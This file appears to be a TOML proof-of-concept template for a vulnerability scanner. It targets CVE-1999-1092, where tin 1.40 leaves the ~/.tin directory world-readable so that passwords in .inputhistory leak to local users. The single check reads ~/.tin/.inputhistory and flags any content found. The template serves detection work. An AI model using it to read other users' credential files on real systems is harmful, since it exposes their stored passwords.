[info]
author = "AVE"
description = "验证 tin 1.40 创建的 .tin 目录权限配置不当（默认权限开放），导致本地其他用户可读取 .inputhistory 文件中存储的密码。通过尝试读取目标用户的 ~/.tin/.inputhistory 文件内容确认漏洞存在。"
id = "POC-AVE-1999-0935"
name = "CVE-1999-1092 PoC"
severity = "medium"
tags = [
    "cve-1999-1092",
    "ave-1999-0935",
]
vuln_id = [
    "CVE-1999-1092",
    "AVE-1999-0935",
]

[poc]
logic = "all"

[[poc.requests]]
path = "~/.tin/.inputhistory"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
regex = ".+"
type = "regex"
